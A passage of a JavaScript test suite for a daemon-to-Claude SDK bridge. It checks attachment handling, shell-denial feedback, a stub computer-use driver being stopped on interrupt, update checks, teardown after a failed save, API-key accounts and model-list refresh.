  const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+jJXcAAAAASUVORK5CYII=", "base64");
  await writeFile(path, png);
  const { turn } = await f.bridge.request("turn/start", { threadId: f.thread.id,
    input: [{ type: "localImage", path }, { type: "image", url: `data:image/png;base64,${png.toString("base64")}` }],
    outputSchema: { type: "object" } });
  const restored = await f.bridge.request("thread/resume", { threadId: f.thread.id, developerInstructions: "Unexpected replacement" });
  assert.equal(restored.thread.status.type, "active");
  await f.finish();
  assert.equal(f.inputs[0].message.content[0].source.media_type, "image/png");
  assert.equal(f.inputs[0].message.content[0].source.data, png.toString("base64"));
  // Wonder's verified attachment bytes arrive inline and are not reread.
  assert.deepEqual(f.inputs[0].message.content[1], f.inputs[0].message.content[0]);
  assert.equal(f.capturedOptions[0].systemPrompt.preset, "claude_code");
  const schemaTool = await f.capturedOptions[0].hooks.PreToolUse[0].hooks[0]({ tool_name: "StructuredOutput", tool_input: { ok: true } });
  assert.equal(schemaTool.hookSpecificOutput.permissionDecision, "allow");
  assert.deepEqual(f.sessions.get(f.thread.id).turns.find(t => t.id === turn.id).structuredOutput, { ok: true });
});

// Contract: an authenticated owner instruction reaches the native deny result
// verbatim, and cannot turn another decision/tool into an instruction channel.
test("shell denial forwards native feedback verbatim only for supported responses", async t => {
  const f = await fixture(t), session = f.sessions.get(f.thread.id);
  const policy = { tools: new Set(), cwd: f.root, decision: async () => "ask" };
  for (const [name, decision, message, expected] of [
    ["Bash", "decline", "  Please inspect café.txt.\nDo not change it.  ", "  Please inspect café.txt.\nDo not change it.  "],
    ["PowerShell", "decline", "Inspect the file first.", "Inspect the file first."],
    ["Bash", "decline", "é".repeat(1000), "é".repeat(1000)],
    ["Bash", "decline", "é".repeat(1001), "The owner declined this action."],
    ["Bash", "decline", " \n", "The owner declined this action."],
    ["Bash", "cancel", "different instruction", "The owner declined this action."],
    ["Read", "decline", "different instruction", "The owner declined this action."],
  ]) {
    const run = { turn: { id: "feedback-turn" }, abort: new AbortController() };
    const result = f.bridge.permission(session, run, policy, name, { command: "npm test" }, { toolUseID: "command" });
    await new Promise(resolve => setImmediate(resolve));
    const request = f.frames.at(-1);
    const command = ["Bash", "PowerShell"].includes(name);
    assert.equal(request.params.supportsDenyMessage, command ? true : undefined);
    assert.equal(request.params.kind, command ? "command" : "tool");
    if (command) assert.equal(request.params.command, "npm test");
    await f.bridge.receive({ id: request.id, result: { decision, message } });
    assert.deepEqual(await result, { behavior: "deny", message: expected });
  }
});

// Windows and Linux hosts: the daemon's Cua Driver runs with the display the
// daemon named, is never offered in plan mode, and changing it starts a new
// process (it is part of the process shape). This driver acts (appends to
// MARK, with its DISPLAY) 300 ms after a call unless it is stopped first.
const CUA_DRIVER = `if (process.env.PID) require("fs").writeFileSync(process.env.PID, String(process.pid));
require("readline").createInterface({ input: process.stdin }).on("line", line => {
  const m = JSON.parse(line); if (m.id == null) return;
  const answer = result => process.stdout.write(JSON.stringify({ jsonrpc: "2.0", id: m.id, result }) + "\\n");
  if (m.method === "initialize" && process.env.HOLD === "initialize") return; // Never initialized.
  if (m.method === "initialize") return answer({ protocolVersion: m.params.protocolVersion, capabilities: { tools: {} }, serverInfo: { name: "cua", version: "1" } });
  if (m.method === "tools/list" && process.env.PID) return; // Never ready: still initializing.
  if (m.method === "tools/list") return answer({ tools: [{ name: "type_text", description: "Type", inputSchema: { type: "object", properties: { text: { type: "string" } }, required: ["text"] } }] });
  if (m.method !== "tools/call") return answer({});
  setTimeout(() => { require("fs").appendFileSync(process.env.MARK, m.params.arguments.text + " on " + process.env.DISPLAY + " " + (process.env.BAD ?? "") + "\\n");
    answer({ content: [{ type: "text", text: "typed" }], isError: false }); }, 300); });`;
async function cuaFixture(t, messages, env = {}) {
  const f = await fixture(t, { messages });
  const mark = join(f.root, "actions");
  f.sessions.get(f.thread.id).options.config = { "mcp_servers.cua_driver": { enabled: true, command: process.execPath, args: ["-e", CUA_DRIVER],
    env: { DISPLAY: ":1", MARK: mark, BAD: 7, ...env } } };
  const actions = () => readFile(mark, "utf8").then(text => text.split("\n").filter(Boolean), () => []);
  const typeText = () => f.capturedOptions.at(-1)?.mcpServers.cua_driver?.tools.find(tool => tool.name === "type_text")?.handler;
  return { ...f, actions, typeText };
}

test("cua driver from the daemon serves its tools outside plan mode", async t => {
  const f = await cuaFixture(t, [{ type: "result", subtype: "success" }]);
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Look" }] });
  await f.finish();
  assert.deepEqual((await f.typeText()({ text: "hi" }, {})).content, [{ type: "text", text: "typed" }]);
  assert.deepEqual(await f.actions(), ["hi on :1 "]);
  // Turning it off is a process change: refused while the process keeps tasks.
  await assert.rejects(f.bridge.request("turn/start", { threadId: f.thread.id,
    input: [{ type: "text", text: "Again" }], config: { "mcp_servers.cua_driver": { enabled: false } } }),
    error => error.action === "retry");
  // The same thread entering and leaving Plan mode, the driver still named.
  const policy = f.sessions.get(f.thread.id).options.wonderPolicy;
  for (const [text, planMode] of [["Plan", true], ["Build", false]]) {
    await f.bridge.endLinger(f.thread.id, false);
    await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text }], wonderPolicy: { ...policy, planMode } });
    await f.finish();
    assert.equal(f.capturedOptions.at(-1).permissionMode === "plan", planMode, text);
    assert.equal(Boolean(f.typeText()), !planMode, text);
  }
});

// Stop ends the computer action, not only the reply: the real driver ignores
// MCP cancellation and would finish it.
test("stopping a reply stops the computer action it is running", { timeout: 10_000 }, async t => {
  const done = Promise.withResolvers();
  const f = await cuaFixture(t, (async function* () { await done.promise; yield { type: "result", subtype: "success" }; })());
  try {
    const { turn } = await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Type" }] });
    while (!f.typeText()) await new Promise(resolve => setImmediate(resolve));
    const running = f.typeText()({ text: "during" }, {});
    await new Promise(resolve => setTimeout(resolve, 100));
    await f.bridge.request("turn/interrupt", { threadId: f.thread.id, turnId: turn.id });
    await assert.rejects(running);
    // Claude cancelling the call itself has the same effect.
    const cancel = new AbortController(), cancelled = f.typeText()({ text: "cancelled" }, { signal: cancel.signal });
    await new Promise(resolve => setTimeout(resolve, 100));
    cancel.abort();
    await assert.rejects(cancelled);
    await assert.rejects(f.typeText()({ text: "late" }, { signal: AbortSignal.abort() }));
    await new Promise(resolve => setTimeout(resolve, 600));
    assert.deepEqual(await f.actions(), []);
  } finally { done.resolve(); await f.finish(); }
});

// Stop reaches a driver that is still starting or listing its tools: the
// session's owner ends it, and Claude never starts with it. The OpenCode
// bridge test of the same name checks the same orderings.
for (const hold of ["initialize", "tools/list"]) test(`stopping a reply while its computer-use driver starts ends the driver (held in ${hold})`, { timeout: 10_000 }, async t => {
  const f = await cuaFixture(t, [{ type: "result", subtype: "success" }], { PID: "", HOLD: hold });
  const pidFile = join(f.root, "driver-pid");
  f.sessions.get(f.thread.id).options.config["mcp_servers.cua_driver"].env.PID = pidFile;
  const { turn } = await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Type" }] });
  let pid;
  while (!(pid = Number(await readFile(pidFile, "utf8").catch(() => "")))) await new Promise(resolve => setTimeout(resolve, 10));
  await f.bridge.request("turn/interrupt", { threadId: f.thread.id, turnId: turn.id });
  const alive = () => { try { process.kill(pid, 0); return true; } catch { return false; } };
  for (let i = 0; alive() && i < 100; i++) await new Promise(resolve => setTimeout(resolve, 10));
  assert.equal(alive(), false, "the starting driver outlived Stop");
  await f.finish();
  assert.equal(f.capturedOptions.some(options => options.mcpServers?.cua_driver), false);
  assert.equal(f.sessions.get(f.thread.id).turns.at(-1).status, "interrupted");
});

test("SDK update status is readable and a forced check never waits for the daily timer", async t => {
  const f = await fixture(t);
  const forced = [];
  f.bridge.updates.status = () => ({ activeVersion: "0.3.283", pendingVersion: forced.length ? "0.3.290" : null });
  f.bridge.updates.refresh = async options => { forced.push(options); };
  assert.deepEqual(await f.bridge.request("runtime/update/read", {}), { activeVersion: "0.3.283", pendingVersion: null });
  assert.deepEqual(await f.bridge.request("runtime/update/check", {}), { activeVersion: "0.3.283", pendingVersion: "0.3.290" });
  assert.deepEqual(forced, [{ force: true }]);
});

// A save that fails while a warm process ends (disk full, a reloaded child
// journal) must still close the process and release its SDK lease, or a staged
// update never activates; the drain that ends it on its own must not crash the runtime.
test("a failed save while a warm process ends still closes it and releases its lease", { timeout: 10_000 }, async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  let released = 0, closed = 0;
  // Only the injected save error counts: a stray rejection from another test is not this teardown's.
  const saveError = new Error("ENOSPC: no space left on device");
  const failed = Promise.withResolvers(), unhandled = [];
  const onUnhandled = reason => { if (reason === saveError) { unhandled.push(reason); failed.resolve(); } };
  process.on("unhandledRejection", onUnhandled);
  t.after(() => process.off("unhandledRejection", onUnhandled));
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Hello" }] });
  await f.finish();
  const handle = f.bridge.lingering.get(f.thread.id);
  assert.ok(handle, "the process stays warm after the reply");
  const close = handle.query.close, release = handle.lease.release, publish = f.bridge.publishSessionStatus;
  handle.query.close = () => { closed++; close.call(handle.query); };
  handle.lease.release = async () => { released++; await release.call(handle.lease); };
  // Publishing the status is the teardown's last step.
  const ended = Promise.withResolvers();
  f.bridge.publishSessionStatus = async function (session, h) {
    try { return await publish.call(this, session, h); } finally { if (h === handle) ended.resolve(); }
  };
  handle.children.set("agent", { projection: { terminal: true }, flush: async () => { throw saveError; } });
  // Closing its input ends the process's stream, so the drain tears it down on its own.
  handle.input.close();
  await Promise.race([ended.promise, failed.promise]);
  // A rejection nothing handles is reported once the microtasks drain.
  await new Promise(resolve => setImmediate(resolve));
  assert.deepEqual(unhandled, []);
  assert.equal(f.bridge.lingering.has(f.thread.id), false);
  assert.equal(closed, 1);
  assert.equal(released, 1);
});


test("an explicit API key passes the same durable turn boundary as a subscription", async t => {
  const f = await fixture(t, { authenticated: false, apiKey: true, messages: [{ type: "result", subtype: "success" }] });
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "fixture" }] });
  await f.finish();
  assert.equal(f.inputs.length, 1);
  assert.equal(f.sessions.get(f.thread.id).turns[0].status, "completed");
  f.bridge.catalog = async () => ({ connected: true, accessKind: "API key", subscription: null });
  f.bridge.updates.status = () => ({});
  const status = await f.bridge.request("account/read", {});
  assert.equal(status.connected, true);
  assert.equal(status.account.type, "apiKey");
  assert.equal(status.account.accessKind, "API key");
});

// Contract: wonderd's existing file-path note survives the Claude SDK boundary;
// video is a file for Claude's tools, with no inline media processing.
test("video file reference reaches Claude through the existing text file path", { timeout: 30000 }, async t => {
  const f = await fixture(t, { messages: [{ type: "result", subtype: "success" }] });
  const path = join(f.root, "Screen recording.mp4");
  const video = Buffer.alloc(9 * 1024 * 1024, 17);
  Buffer.from("00000018667479706d7034320000000069736f6d6d703432", "hex").copy(video);
  await writeFile(path, video);
  const note = `Attached file \`Screen recording.mp4\` is available at \`${path}\`.`;
  await f.bridge.request("turn/start", { threadId: f.thread.id, input: [{ type: "text", text: "Inspect this recording" }, { type: "text", text: note }] });
  await f.finish();
  assert.deepEqual(f.inputs[0].message.content, [{ type: "text", text: "Inspect this recording" }, { type: "text", text: note }]);
  assert.deepEqual(await readFile(path), video);
  assert.ok(Buffer.byteLength(JSON.stringify(f.inputs[0])) < 2000);
});

test("a new SDK that lists a new model id shows it after activation without a restart", async t => {
  const f = await fixture(t);
  let models = [{ id: "fable", resolvedModel: "claude-fable-5-1", name: "Fable" }];
  f.bridge.inspect = async () => ({ connected: true, subscription: "Claude Pro", models, servers: [] });
  const names = async () => (await f.bridge.request("model/list", {})).data.map(m => [m.id, m.displayName]);
  assert.deepEqual(await names(), [["claude:fable", "Fable 5.1"]]);
  models = [{ id: "fable", resolvedModel: "claude-fable-5-2", name: "Fable" }, { id: "claude-nova-9-1", name: "Nova Prime" }];
  // Still cached until the runtime activates the new SDK.
  assert.deepEqual(await names(), [["claude:fable", "Fable 5.1"]]);
  await f.activate("0.3.322");
  assert.deepEqual(await names(), [["claude:fable", "Fable 5.2"], ["claude:claude-nova-9-1", "Nova 9.1"]]);
});
